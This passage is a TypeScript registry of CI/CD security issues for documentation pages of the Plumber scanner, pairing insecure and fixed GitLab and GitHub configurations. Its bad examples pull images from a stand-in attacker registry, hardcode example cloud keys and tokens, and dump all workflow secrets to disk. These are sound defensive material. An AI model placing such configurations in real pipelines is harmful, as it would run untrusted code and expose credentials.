/**
 * Plumber issues registry for documentation pages.
 *
 * Each entry is keyed by its `ISSUE-XXX` code and holds per-provider
 * content under `gitlab` and/or `github`. Because the same code can
 * mean different things on each provider (e.g. ISSUE-301), severity,
 * title, category and config keys all live inside the provider block.
 * Only `code` is shared at the top level.
 */

export type Provider = "gitlab" | "github";
export type Severity = "critical" | "high" | "medium" | "low";
export type FixDuration =
  | "immediate"
  | "very quick"
  | "quick"
  | "medium"
  | "long"
  | "extended";
export type ProductScope = "all" | "cli" | "platform";
export type ControlStatus = "shipping" | "roadmap";

export interface IssueProviderContent {
  title: string;
  category: string;
  severity: Severity;
  /** Approximate time required to fix the issue */
  fixDuration: FixDuration;
  controlName: string;
  controlConfigKey: string;
  description: string;
  impact: string;
  remediation: string;
  /** YAML/config example showing the problematic configuration */
  badExample: string;
  badExampleCaption: string;
  /** YAML/config example showing the fixed configuration */
  goodExample: string;
  goodExampleCaption: string;
  /** Additional tips or notes */
  tips: string[];
  /**
   * Where this control applies: Plumber Platform and CLI (`all`),
   * Plumber Platform only (`platform`), or Open Source CLI analysis
   * only (`cli`). Omit for `all`.
   */
  productScope?: ProductScope;
  /** Related issue codes shown on the detail page. */
  relatedCodes: string[];
  /**
   * Where this control sits in the engine's lifecycle:
   *   - "shipping": findings reach the user when the control is enabled.
   *   - "roadmap":  the rego policy exists but findings are dropped by the
   *                 dev-side bench gate. Documented here so users can see
   *                 what is coming; not enabled in the bundled config.
   * Omit for "shipping" (the default).
   */
  status?: ControlStatus;
}

export interface IssueDoc {
  code: string;
  gitlab?: IssueProviderContent;
  github?: IssueProviderContent;
}

/** Roadmap issues and the "On the roadmap" docs section are hidden until enabled. */
export const SHOW_ROADMAP = false;

/** Whether this provider block is shown in lists, tabs, and detail panels. */
export function isVisibleProviderContent(content: IssueProviderContent): boolean {
  return SHOW_ROADMAP || content.status !== "roadmap";
}

/** Shared codes that keep provider-specific titles (GitHub wording differs). */
const PROVIDER_SPECIFIC_ISSUE_TITLES = new Set(["ISSUE-203"]);

/**
 * Docs title for a provider. When an issue exists on both GitLab and GitHub,
 * both tabs use the GitLab title so the shared ISSUE-XXX identity stays consistent,
 * except for codes listed in PROVIDER_SPECIFIC_ISSUE_TITLES.
 */
export function issueDisplayTitle(doc: IssueDoc, provider: Provider): string | null {
  const content = doc[provider];
  if (!content) return null;
  if (doc.gitlab && doc.github && !PROVIDER_SPECIFIC_ISSUE_TITLES.has(doc.code)) {
    return doc.gitlab.title;
  }
  return content.title;
}

export const issues: Record<string, IssueDoc> = {

  "ISSUE-101": {
    code: "ISSUE-101",
    gitlab: {
      title: "Untrusted image source",
      category: "CI/CD Container Images",
      severity: "high",
      fixDuration: "medium",
      controlName: "Container images must come from authorized sources",
      controlConfigKey: "containerImageMustComeFromAuthorizedSources",
      description:
        "The origin of a container image you are using to run your CI/CD is not trusted, posing a security risk.",
      impact:
        "Untrusted image sources can introduce malicious code into your pipeline. For instance, a malicious image can steal your API tokens, your source code, and even alter it.",
      remediation:
        "Replace the container image with an image coming from a source declared as trusted in your Policy controls.",
      badExample: `# .gitlab-ci.yml — ❌ Images from untrusted registries
security-scan:
  image: untrusted-registry.example.com/scanner:2.0
  script:
    - scan --project .

sast:
  image: attacker-registry.example.com/malicious/sast:latest
  script:
    - sast-scan .`,
      badExampleCaption: "Images from unknown registries could be compromised.",
      goodExample: `# .gitlab-ci.yml — ✅ Images from authorized registries
security-scan:
  image: registry.gitlab.com/security-products/secrets:7
  script:
    - scan --project .

sast:
  image: $CI_REGISTRY_IMAGE/custom-sast:1.2.0
  script:
    - sast-scan .

# .plumber.yaml — Authorized sources configuration
# containerImageMustComeFromAuthorizedSources:
#   enabled: true
#   trustDockerHubOfficialImages: true
#   trustedUrls:
#     - registry.gitlab.com/security-products/*
#     - $CI_REGISTRY_IMAGE:*
#     - $CI_REGISTRY_IMAGE/*`,
      goodExampleCaption: "Only images from trusted registries should be used.",
      tips: [
        "Enable `trustDockerHubOfficialImages: true` to allow official Docker Hub images (e.g., `python`, `node`).",
        "Use wildcard patterns in `trustedUrls` (e.g., `gcr.io/your-org/*`).",
        "Consider setting up a private registry mirror for external images.",
      ],
      relatedCodes: ["ISSUE-102"],
    },
    github: {
      title: "Untrusted image source",
      category: "CI/CD Container Images",
      severity: "high",
      fixDuration: "medium",
      controlName: "Container images must come from authorized sources",
      controlConfigKey: "containerImageMustComeFromAuthorizedSources",
      description:
        "A workflow job runs in a container or service image pulled from a registry that is not in your trusted-sources list.",
      impact:
        "An untrusted registry can serve a backdoored image. Once the runner pulls it, the image executes inside the job with access to whichever secrets the job uses — `GITHUB_TOKEN`, deploy keys, AWS credentials.",
      remediation:
        "Replace the image with one from a registry declared as trusted in `.plumber.yaml`. For public images, prefer `ghcr.io/owner/...` (where `owner` is a vetted organisation) or Docker Hub Official Images.",
      badExample: `# .github/workflows/test.yml — ❌ Untrusted registries
name: test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: untrusted-registry.example.com/scanner:2.0
    steps:
      - run: scan --project .
  api:
    runs-on: ubuntu-latest
    services:
      redis:
        image: attacker-registry.example.com/redis:latest
    steps:
      - run: pytest`,
      badExampleCaption: "Both the container image and the service image come from registries not in the trusted-source list.",
      goodExample: `# .github/workflows/test.yml — ✅ Trusted registries only
name: test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/my-org/scanner:2.0
    steps:
      - run: scan --project .
  api:
    runs-on: ubuntu-latest
    services:
      redis:
        image: redis:7-alpine   # Docker Hub Official Image
    steps:
      - run: pytest

# .plumber.yaml — Authorized sources configuration
github:
  controls:
    containerImageMustComeFromAuthorizedSources:
      enabled: true
      trustDockerHubOfficialImages: true
      trustedUrls:
        - ghcr.io/my-org/*`,
      goodExampleCaption: "Images come from ghcr.io (your org) or Docker Hub Official Images.",
      tips: [
        "Enable `trustDockerHubOfficialImages: true` to allow short references like `redis:7-alpine` without listing each one.",
        "Use wildcard patterns in `trustedUrls` (`ghcr.io/my-org/*`).",
        "GitHub container references include `jobs.*.container`, `jobs.*.services.*`, and `uses: docker://...` action refs.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-102", "ISSUE-706"],
    },
  },

  "ISSUE-102": {
    code: "ISSUE-102",
    gitlab: {
      title: "Forbidden container image tag",
      category: "CI/CD Container Images",
      severity: "medium",
      fixDuration: "quick",
      controlName: "Container images must not use forbidden tags",
      controlConfigKey: "containerImageMustNotUseForbiddenTags",
      description:
        "A container image used to run a CI/CD job is using a tag that is forbidden by your configuration.",
      impact:
        "Using forbidden tags can result in insecure containers running in your CI/CD pipelines or unexpected breaking changes. For instance, if your pipeline uses the `latest` tag, it might pull a compromised, untested, or breaking image.",
      remediation:
        "Update the image tag to a tag allowed by your Policy controls.",
      badExample: `# .gitlab-ci.yml — ❌ Uses "latest" tag (forbidden)
build:
  image: python:latest
  script:
    - pip install -r requirements.txt
    - python setup.py build

lint:
  image: golangci/golangci-lint:latest
  script:
    - golangci-lint run`,
      badExampleCaption: "These jobs use the `latest` tag, which is mutable and may change unexpectedly.",
      goodExample: `# .gitlab-ci.yml — ✅ Uses specific version tags
build:
  image: python:3.12.1
  script:
    - pip install -r requirements.txt
    - python setup.py build

lint:
  image: golangci/golangci-lint:v1.62.2
  script:
    - golangci-lint run`,
      goodExampleCaption: "Specific version tags ensure reproducible builds.",
      tips: [
        "Configure forbidden tags in `.plumber.yaml` under `containerImageMustNotUseForbiddenTags.tags`.",
        "Common forbidden tags include: `latest`, `dev`, `staging`, `main`, `master`.",
      ],
      relatedCodes: ["ISSUE-101"],
    },
    github: {
      title: "Forbidden container image tag",
      category: "CI/CD Container Images",
      severity: "medium",
      fixDuration: "quick",
      controlName: "Container images must not use forbidden tags",
      controlConfigKey: "containerImageMustNotUseForbiddenTags",
      description:
        "A workflow runs against a container image referenced by a forbidden tag (e.g. `latest`, `dev`, `main`).",
      impact:
        "Mutable tags can move between runs. A `latest` tag that passed today's job might point at a different image tomorrow — including a compromised one — without any change to the workflow file.",
      remediation:
        "Pin the image to an immutable version tag, or better yet to a digest (see ISSUE-103).",
      badExample: `# .github/workflows/build.yml — ❌ Uses "latest"
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:latest
    steps:
      - run: npm ci && npm test`,
      badExampleCaption: "`latest` is mutable — the image can change underneath you.",
      goodExample: `# .github/workflows/build.yml — ✅ Specific version
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:20.18.1
    steps:
      - run: npm ci && npm test

# .plumber.yaml
github:
  controls:
    containerImageMustNotUseForbiddenTags:
      enabled: true
      tags: [latest, dev, staging, main, master]`,
      goodExampleCaption: "Specific minor + patch version pinned for reproducibility.",
      tips: [
        "Forbidden tags default to `latest`, `dev`, `staging`, `main`, `master`. Override via `containerImageMustNotUseForbiddenTags.tags`.",
        "Pair with ISSUE-103 to require digest pinning on top of immutable tags.",
      ],
      relatedCodes: ["ISSUE-101", "ISSUE-103"],
    },
  },

  "ISSUE-201": {
    code: "ISSUE-201",
    gitlab: {
      title: "Unprotected variable",
      category: "CI/CD Variables",
      severity: "medium",
      fixDuration: "quick",
      productScope: "platform",
      controlName: "CI/CD variables must be protected",
      controlConfigKey: "cicdVariablesMustBeProtected",
      description:
        "A variable can be used in CI/CD pipelines of all branches and tags, making its value exposed to all users in the project.",
      impact:
        "Unauthorized users can exploit unprotected variables, leading to potential security breaches. For example, if your deployment key is exposed on an unprotected branch, it could be used to deploy malicious code by a member with a low role on the project.",
      remediation:
        "Protect sensitive CI/CD variables to restrict their usage only to protected branches or tags.",
      badExample: `# GitLab project settings — ❌ Variable not protected
# Settings > CI/CD > Variables:
#
#   Key:       DEPLOY_KEY
#   Value:     -----BEGIN RSA PRIVATE KEY-----...
#   Protected: false   ← Any branch can use this
#   Masked:    true
#
# This variable is available in ALL pipelines, including
# those triggered by untrusted branches or members with
# low roles (e.g., Reporter, Developer).`,
      badExampleCaption: "The DEPLOY_KEY variable is not protected and can be used on any branch.",
      goodExample: `# GitLab project settings — ✅ Variable protected
# Settings > CI/CD > Variables:
#
#   Key:       DEPLOY_KEY
#   Value:     -----BEGIN RSA PRIVATE KEY-----...
#   Protected: true    ← Only available on protected branches/tags
#   Masked:    true`,
      goodExampleCaption: "Protecting the variable restricts its use to protected branches and tags only.",
      tips: [
        "Enable variable protection in GitLab under `Settings > CI/CD > Variables`.",
        "Protected variables are only injected into pipelines running on protected branches or tags.",
        "Combine with masking (see ISSUE-202) to also hide the value from logs.",
      ],
      relatedCodes: ["ISSUE-202"],
    },
  },

  "ISSUE-202": {
    code: "ISSUE-202",
    gitlab: {
      title: "Unmasked variable",
      category: "CI/CD Variables",
      severity: "medium",
      fixDuration: "quick",
      productScope: "platform",
      controlName: "CI/CD variables must be masked",
      controlConfigKey: "cicdVariablesMustBeMasked",
      description:
        "A CI/CD variable stored in a GitLab project or group is not masked, causing its value to be exposed in pipeline logs.",
      impact:
        "Exposed variable values can result in unauthorized access to your sensitive data. For instance, if your database password is visible in logs, it can be exploited to gain direct database access.",
      remediation:
        "Mask the CI/CD variable to hide its value in logs.",
      badExample: `# GitLab project settings — ❌ Variable not masked
# Settings > CI/CD > Variables:
#
#   Key:    DATABASE_PASSWORD
#   Value:  MySecretP@ssw0rd!
#   Masked: false   ← Value will appear in job logs
#
# Job log output (anyone with access can read this):
#   $ echo $DATABASE_PASSWORD
#   MySecretP@ssw0rd!`,
      badExampleCaption: "The unmasked variable value appears in plain text in job logs.",
      goodExample: `# GitLab project settings — ✅ Variable masked
# Settings > CI/CD > Variables:
#
#   Key:    DATABASE_PASSWORD
#   Value:  MySecretP@ssw0rd!
#   Masked: true   ← Value is hidden in logs as [MASKED]
#
# Job log output (value is hidden):
#   $ echo $DATABASE_PASSWORD
#   [MASKED]`,
      goodExampleCaption: "Masking the variable hides its value in all pipeline logs.",
      tips: [
        "Enable masking in GitLab under **Settings > CI/CD > Variables**.",
        "GitLab requires masked values to meet certain format requirements (at least 8 characters, no spaces).",
        "For variables that cannot be masked due to format, consider using an external secrets manager.",
        "Combine with protection (see ISSUE-201) for full coverage.",
      ],
      relatedCodes: ["ISSUE-201", "ISSUE-301"],
    },
  },

  "ISSUE-301": {
    code: "ISSUE-301",
    gitlab: {
      title: "Secret leak in pipeline configuration",
      category: "CI/CD Secrets",
      severity: "critical",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Pipeline must not leak secrets in configuration",
      controlConfigKey: "pipelineMustNotLeakSecretsInConfig",
      description:
        "A secret (API key, private key, password, cloud credential) is hardcoded in `.gitlab-ci.yml` or any included file, making it visible to anyone with repository access. Plumber resolves the full merged pipeline YAML and pipes it through gitleaks at analyze time; any high-confidence match against the built-in rule catalog (or a custom `.gitleaks.toml` via `gitleaksConfigPath`) becomes an ISSUE-301 finding. The detected value never leaves the scanner — each finding's `preview` carries a redacted form with first/last 4 characters visible and the middle replaced with asterisks.",
      impact:
        "Hardcoded secrets increase the risk of unauthorized access to your systems, data leaks, and resource misuse. For example, if your API key is exposed, attackers could use it to access your cloud services, resulting in high costs or data theft.",
      remediation:
        "Revoke and rotate the exposed secret immediately, remove it from the configuration file, then inject it securely using GitLab CI/CD variables or an external secrets manager.",
      badExample: `# .gitlab-ci.yml — ❌ Hardcoded secrets (CRITICAL)
deploy:
  stage: deploy
  script:
    - export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
    - export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    - aws s3 sync . s3://my-bucket

api-call:
  variables:
    API_TOKEN: "ghp_exampleTokenHardcodedHere123"
  script:
    - curl -H "Authorization: token $API_TOKEN" https://api.example.com`,
      badExampleCaption: "Secrets hardcoded in .gitlab-ci.yml are visible in the repository to all members.",
      goodExample: `# .gitlab-ci.yml — ✅ Secrets injected via CI/CD variables
deploy:
  stage: deploy
  script:
    # AWS credentials injected from protected CI/CD variables
    - aws s3 sync . s3://my-bucket

api-call:
  script:
    - curl -H "Authorization: token $API_TOKEN" https://api.example.com

# In GitLab: Settings > CI/CD > Variables
# Add: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, API_TOKEN
# Set Protected: true, Masked: true for each`,
      goodExampleCaption: "Secrets are stored securely as CI/CD variables, not in the repository.",
      tips: [
        "If a secret was ever committed, treat it as compromised and rotate it immediately.",
        "Use GitLab's secret detection feature to scan for leaked credentials in your repository history.",
        "For production workloads, consider using an external secrets manager (HashiCorp Vault, AWS Secrets Manager, etc.).",
        "Add secret patterns to `.gitignore` or use pre-commit hooks to prevent accidental commits.",
      ],
      relatedCodes: ["ISSUE-201", "ISSUE-202"],
    },
    github: {
      title: "Secret leak in pipeline configuration",
      category: "CI/CD Secrets",
      severity: "critical",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Pipeline must not leak secrets in configuration",
      controlConfigKey: "pipelineMustNotLeakSecretsInConfig",
      description:
        "A workflow serialises every available secret in one go via `toJson(secrets)` or `env: $${{ toJson(secrets) }}`. The aggregated JSON bypasses GitHub's per-string log redaction.",
      impact:
        "GitHub's redactor masks known secret *strings* in logs. A `toJson(secrets)` dump produces a single JSON value containing every secret as a substring of a larger string; the redactor does not recognise the wrapping and the secrets leak verbatim.",
      remediation:
        "Reference each secret individually (`${{ secrets.AWS_ACCESS_KEY_ID }}`) and prefer scoping them to the smallest step that needs them.",
      badExample: `# .github/workflows/deploy.yml — ❌ Aggregated secrets dump
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          ALL_SECRETS: \${{ toJson(secrets) }}
        run: echo "$ALL_SECRETS" > /tmp/sec.json && ./debug.sh /tmp/sec.json`,
      badExampleCaption: "The aggregated JSON appears unredacted in logs and on disk.",
      goodExample: `# .github/workflows/deploy.yml — ✅ Scoped per-secret
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          AWS_ACCESS_KEY_ID: \${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: \${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: aws s3 sync . s3://my-bucket

# .plumber.yaml
github:
  controls:
    workflowMustNotDumpSecretsContext:
      enabled: true`,
      goodExampleCaption: "Each secret stays a separate, redactable string.",
      tips: [
        "Same shape as ISSUE-213 (github-context dump) but with secrets — and therefore one severity higher.",
        "If you genuinely need to enumerate secrets (rare), do it inside an `environment:` with a required reviewer and revoke afterward.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-213", "ISSUE-302", "ISSUE-303"],
    },
  },

  "ISSUE-401": {
    code: "ISSUE-401",
    gitlab: {
      title: "Hardcoded job",
      category: "Pipeline Composition",
      severity: "medium",
      fixDuration: "medium",
      controlName: "Pipeline must not contain hardcoded jobs",
      controlConfigKey: "pipelineMustNotIncludeHardcodedJobs",
      description:
        "A job in the pipeline configuration is hardcoded, increasing maintainability costs and introducing a compliance risk.",
      impact:
        "Hardcoded jobs make pipelines harder to maintain and adapt to changes. Moreover, they introduce a risk of being non-compliant with the organization's standards. For instance, if your security check job is hardcoded, you might miss the organization's security standards checks.",
      remediation:
        "Replace the hardcoded job in the project CI/CD configuration with a template or component inclusion.",
      badExample: `# .gitlab-ci.yml — ❌ Jobs defined directly (hardcoded)
stages:
  - test
  - build
  - deploy

test:
  stage: test
  image: python:3.12
  script:
    - pip install pytest
    - pytest tests/

build:
  stage: build
  image: docker:27
  script:
    - docker build -t $CI_REGISTRY_IMAGE .
    - docker push $CI_REGISTRY_IMAGE`,
      badExampleCaption: "All jobs are hardcoded — no reuse, no governance.",
      goodExample: `# .gitlab-ci.yml — ✅ Jobs from CI/CD components and includes
include:
  # CI/CD Component from the catalog
  - component: gitlab.com/components/sast/sast@1.2.0
  # Shared template from another project
  - project: my-org/ci-templates
    ref: v2.1.0
    file: /templates/docker-build.yml

stages:
  - test
  - build
  - deploy

# Only project-specific configuration remains
variables:
  DOCKER_IMAGE_NAME: my-app`,
      goodExampleCaption: "Jobs come from versioned components and templates.",
      tips: [
        "Browse the [GitLab CI/CD Catalog](https://gitlab.com/explore/catalog) for reusable components.",
        "Create shared templates in a dedicated project for organization-specific jobs.",
        "Some project-specific jobs may be acceptable — discuss with your team what should be centralized.",
      ],
      relatedCodes: ["ISSUE-403", "ISSUE-404"],
    },
  },

  "ISSUE-403": {
    code: "ISSUE-403",
    gitlab: {
      title: "Outdated template",
      category: "Pipeline Composition",
      severity: "low",
      fixDuration: "quick",
      controlName: "Pipeline must use only up-to-date includes",
      controlConfigKey: "includesMustBeUpToDate",
      description:
        "An outdated template is used in the project CI/CD pipeline configuration.",
      impact:
        "Outdated templates may have known vulnerabilities or lack compliance with current standards. For example, if your security scan template is outdated, it might miss detecting recent threats.",
      remediation:
        "Update the template in your project CI/CD configuration file to the latest version to ensure security and compliance.",
      badExample: `# .gitlab-ci.yml — ❌ Uses outdated version
include:
  - component: gitlab.com/components/sast/sast@1.0.0
    # Latest available: 1.5.2

  - component: gitlab.com/components/secret-detection/secret-detection@2.1.0
    # Latest available: 2.4.1`,
      badExampleCaption: "Components are several versions behind the latest release.",
      goodExample: `# .gitlab-ci.yml — ✅ Uses latest versions
include:
  - component: gitlab.com/components/sast/sast@1.5.2

  - component: gitlab.com/components/secret-detection/secret-detection@2.4.1`,
      goodExampleCaption: "Components are up to date with the latest releases.",
      tips: [
        "Use Plumber regularly to detect outdated includes before they become a security risk.",
        "Consider using Renovate or Dependabot to automate version updates in your CI configuration.",
        "Check the CI Catalog changelog for breaking changes before updating major versions.",
      ],
      relatedCodes: ["ISSUE-401", "ISSUE-404"],
    },
  },

  "ISSUE-404": {
    code: "ISSUE-404",
    gitlab: {
      title: "Forbidden include version",
      category: "Pipeline Composition",
      severity: "medium",
      fixDuration: "quick",
      controlName: "Pipeline must not use forbidden ref in includes",
      controlConfigKey: "includesMustNotUseForbiddenVersions",
      description:
        "A CI/CD template in your pipeline is included using a version that is forbidden by your configuration.",
      impact:
        "Using forbidden tags can result in insecure templates running in your CI/CD pipelines or unexpected breaking changes. For instance, if you include a template using the `main` version (default branch of the source repository), it might pull a compromised, untested, or breaking template.",
      remediation:
        "Update the template include version to a version allowed by your Policy controls.",
      badExample: `# .gitlab-ci.yml — ❌ Uses forbidden version references
include:
  - component: gitlab.com/components/sast/sast@latest

  - project: my-org/ci-templates
    ref: main
    file: /templates/security.yml

  - component: gitlab.com/my-org/custom-scanner/scan@HEAD`,
      badExampleCaption: "`latest`, `main`, and `HEAD` are mutable and forbidden.",
      goodExample: `# .gitlab-ci.yml — ✅ Uses specific version tags
include:
  - component: gitlab.com/components/sast/sast@1.5.2

  - project: my-org/ci-templates
    ref: v2.1.0
    file: /templates/security.yml

  - component: gitlab.com/my-org/custom-scanner/scan@3.0.1`,
      goodExampleCaption: "Specific version tags ensure reproducible pipelines.",
      tips: [
        "Configure forbidden version patterns in `.plumber.yaml` under `includesMustNotUseForbiddenVersions.forbiddenVersions`.",
        "Default forbidden versions: `latest`, `~latest`, `main`, `master`, `HEAD`.",
        "Set `defaultBranchIsForbiddenVersion: true` to also forbid using the project's default branch name.",
      ],
      relatedCodes: ["ISSUE-401", "ISSUE-403"],
    },
  },

  "ISSUE-405": {
    code: "ISSUE-405",
    gitlab: {
      title: "Missing required template",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "medium",
      controlName: "Pipelines must include templates",
      controlConfigKey: "pipelineMustIncludeTemplate",
      description:
        "A required CI/CD template, as defined in your Policy controls, is missing in the project pipeline.",
      impact:
        "Missing templates result in non-compliant and insecure pipeline configurations. For example, if your pipeline is missing a security scan template, vulnerabilities might go undetected.",
      remediation:
        "Include the missing template in the CI/CD pipeline configuration of the project.",
      badExample: `# .gitlab-ci.yml — ❌ Missing required template
include:
  - project: my-org/ci-templates
    ref: v2.1.0
    file: /templates/build.yml
  # Missing: /templates/security.yml (required by policy)

# .plumber.yaml
# pipelineMustIncludeTemplate:
#   enabled: true
#   required: templates/build AND templates/security`,
      badExampleCaption: "The security template is required but not included.",
      goodExample: `# .gitlab-ci.yml — ✅ All required templates included
include:
  - project: my-org/ci-templates
    ref: v2.1.0
    file: /templates/build.yml
  - project: my-org/ci-templates
    ref: v2.1.0
    file: /templates/security.yml`,
      goodExampleCaption: "Both required templates are included.",
      tips: [
        "Use the same expression syntax as components (`AND`, `OR`, parentheses).",
        "Templates are matched by their file path pattern.",
        "Coordinate with your platform team to know which templates are mandatory.",
      ],
      relatedCodes: ["ISSUE-406", "ISSUE-408"],
    },
  },

  "ISSUE-406": {
    code: "ISSUE-406",
    gitlab: {
      title: "Forbidden override of required template",
      category: "Pipeline Composition",
      severity: "medium",
      fixDuration: "medium",
      controlName: "Pipelines must include templates",
      controlConfigKey: "pipelineMustIncludeTemplate",
      description:
        "A required CI/CD template, as defined in your Policy controls, has been overridden in the project pipeline.",
      impact:
        "Overriding required templates can lead to non-compliant and insecure pipelines. For example, overriding a SAST template might bypass mandatory checks.",
      remediation:
        "Remove overrides from the project CI/CD configuration. If overrides are relevant, include them in the required template or create a new one.",
      badExample: `# .gitlab-ci.yml — ❌ Overrides required template job
include:
  - project: my-org/ci-templates
    ref: v2.1.0
    file: /templates/security.yml

# Overrides the security-scan job from the template
security-scan:
  script:
    - echo "Security scan disabled for speed"
  when: manual`,
      badExampleCaption: "The template's security-scan job is overridden and made manual.",
      goodExample: `# .gitlab-ci.yml — ✅ Template included without overrides
include:
  - project: my-org/ci-templates
    ref: v2.1.0
    file: /templates/security.yml

# No local overrides — template jobs run as designed
# Use variables for customization:
variables:
  SECURITY_SCAN_LEVEL: "high"`,
      goodExampleCaption: "Template jobs run as designed, configuration via variables.",
      tips: [
        "Design templates with configurable variables so teams don't need to override jobs.",
        "Plumber shows exactly which job keys are overridden in the issue details.",
        "Consider making critical template jobs non-overridable by design.",
      ],
      relatedCodes: ["ISSUE-405", "ISSUE-409"],
    },
  },

  "ISSUE-501": {
    code: "ISSUE-501",
    gitlab: {
      title: "Branch protection missing",
      category: "Access and Authorization",
      severity: "critical",
      fixDuration: "quick",
      controlName: "Branch must be protected",
      controlConfigKey: "branchMustBeProtected",
      description:
        "A branch is not protected on the repository.",
      impact:
        "Unprotected branches are highly vulnerable to unauthorized modifications. For instance, any member can push malicious code directly to your production branch without any review or validation.",
      remediation:
        "Enable branch protection on the branch to restrict changes to authorized users only.",
      badExample: `# GitLab project settings — ❌ Branch not protected
# Branch "main" has no protection rules
# Anyone with Developer access can:
#   - Push directly
#   - Force push
#   - Delete the branch

# .plumber.yaml configuration requiring protection:
branchMustBeProtected:
  enabled: true
  defaultMustBeProtected: true
  namePatterns:
    - main
    - release/*`,
      badExampleCaption: "The `main` branch has no protection, violating the policy.",
      goodExample: `# GitLab project settings — ✅ Branch properly protected
# Settings > Repository > Protected Branches:
#
#   Branch: main
#   Allowed to merge: Developers + Maintainers
#   Allowed to push: Maintainers
#   Allow force push: No
#   Code owner approval required: Yes

# .plumber.yaml
branchMustBeProtected:
  enabled: true
  defaultMustBeProtected: true
  namePatterns:
    - main
    - release/*
  allowForcePush: false
  codeOwnerApprovalRequired: true
  minMergeAccessLevel: 30   # Developer
  minPushAccessLevel: 40    # Maintainer`,
      goodExampleCaption: "Proper branch protection with restricted push access and code review requirements.",
      tips: [
        "Use `namePatterns` with wildcards to protect branch families (e.g., `release/*`).",
        "Set `minPushAccessLevel: 40` (Maintainer) to prevent developers from pushing directly.",
        "Enable `codeOwnerApprovalRequired` if you use a CODEOWNERS file.",
      ],
      relatedCodes: ["ISSUE-505"],
    },
    github: {
      title: "Branch protection missing",
      category: "Access and Authorization",
      severity: "critical",
      fixDuration: "quick",
      controlName: "Branch must be protected",
      controlConfigKey: "branchMustBeProtected",
      description:
        "A branch matching the configured protection patterns has no protection rule in either classic Branch Protection or any Repository or Organization Ruleset that covers it. Plumber reads both mechanisms and treats a branch as protected only when at least one of them applies.",
      impact:
        "Without protection on the matching branches, anyone with write access can push directly, force-push, rewrite history, or delete the branch. Required reviews, code-owner approvals, and status checks are all bypassed.",
      remediation:
        "Add protection through either mechanism. Classic Branch Protection lives under Settings > Branches; Repository Rulesets live under Settings > Rules > Rulesets (rulesets inherited from the organization count too). Plumber merges all sources, stricter wins, so a rule defined in one mechanism contributes to the effective configuration even if the other has nothing for the same branch.",
      badExample: `# GitHub repo settings — ❌ No protection on \`main\`
# Settings > Rules > Rulesets:
#   (no ruleset targeting \`main\`)
#
# Anyone with Write access can:
#   - push directly to \`main\`
#   - force-push and rewrite history
#   - delete the branch

# .plumber.yaml
github:
  controls:
    branchMustBeProtected:
      enabled: true
      namePatterns: [main, release/*]
      allowForcePush: false
      requirePullRequestReviews: true`,
      badExampleCaption: "`main` has no ruleset; the protection policy is not satisfied.",
      goodExample: `# GitHub repo settings — ✅ Ruleset enforces review + no force-push
# Settings > Rules > Rulesets > New branch ruleset:
#   Target: main
#   Rules:
#     - Restrict deletions
#     - Block force pushes
#     - Require a pull request before merging
#         · Required approvals: 1
#         · Dismiss stale approvals on new push
#         · Require review from Code Owners
#     - Require status checks to pass before merging
#         · build, test, codeql`,
      goodExampleCaption: "Ruleset enforces review + bans force-push + requires status checks.",
      tips: [
        "Plumber needs `Administration: Read` (fine-grained PAT) or `repo` scope (classic) to read protection rules at all. Without it the rule reports `partialControls` (abstain), not a pass.",
        "Classic Branch Protection and Rulesets are unioned. A code-owner-approval rule defined only in a Ruleset (no classic rule for the same branch) is still seen.",
        "Disabled or evaluate-mode rulesets are ignored automatically. Only enforced rulesets contribute to the effective configuration.",
        "`namePatterns` accepts glob patterns. Common: `[main, master, release/*, v*.*.*]`.",
        "Pair with ISSUE-505 for per-setting non-compliance (force-push allowed, code-owner approvals missing, etc.).",
      ],
      relatedCodes: ["ISSUE-505"],
    },
  },

  "ISSUE-601": {
    code: "ISSUE-601",
    gitlab: {
      title: "Missing security policy source on project",
      category: "Security Source",
      severity: "critical",
      fixDuration: "quick",
      productScope: "platform",
      controlName: "Project must have a security policy source",
      controlConfigKey: "projectMustHaveSecurityPolicySource",
      description:
        "The project lacks the security policy source defined in your Policy controls, violating compliance requirements.",
      impact:
        "Without a security policy source, your project may become non-compliant and vulnerable to risks. For example, if your project lacks a defined security policy source, critical checks might not be enforced.",
      remediation:
        "Define the security policy source as defined in your Policy controls on the project to ensure compliance and security.",
      badExample: `# GitLab project settings — ❌ No security policy source
# Secure > Security configuration > Security policy project:
#   (none)
#
# The project has no linked security policy project, meaning
# no security policies are enforced on this project.`,
      badExampleCaption: "No security policy project is linked to this GitLab project.",
      goodExample: `# GitLab project settings — ✅ Security policy source configured
# Secure > Security configuration > Security policy project:
#   my-org/security-policies
#
# The project is now linked to the organization's security
# policy repository, ensuring all security policies are enforced.`,
      goodExampleCaption: "The project is linked to the organization's security policy source.",
      tips: [
        "Create a dedicated security policy project in your organization to centralize all security policies.",
        "Security policy sources can be managed at the group level to apply to all projects at once.",
        "Check GitLab documentation for supported security policy types (scan execution, scan result, etc.).",
      ],
      relatedCodes: ["ISSUE-407"],
    },
  },

  "ISSUE-422": {
    code: "ISSUE-422",
    github: {
      title: "Workflow has no explicit name",
      category: "Pipeline Composition",
      severity: "low",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must have an explicit name",
      controlConfigKey: "workflowsMustHaveExplicitName",
      description:
        "A workflow file has no top-level `name:` field. GitHub falls back to the filename in the UI.",
      impact:
        "Filename-as-display-name makes review and incident response harder: `test.yml`, `ci.yml` and `build.yml` all blur together in the Actions UI. Branch protection's `Required status checks` keys off the resolved name, so renames here trip CI in surprising ways.",
      remediation:
        "Add a top-level `name:` field describing the workflow.",
      badExample: `# .github/workflows/test.yml — ❌ No name
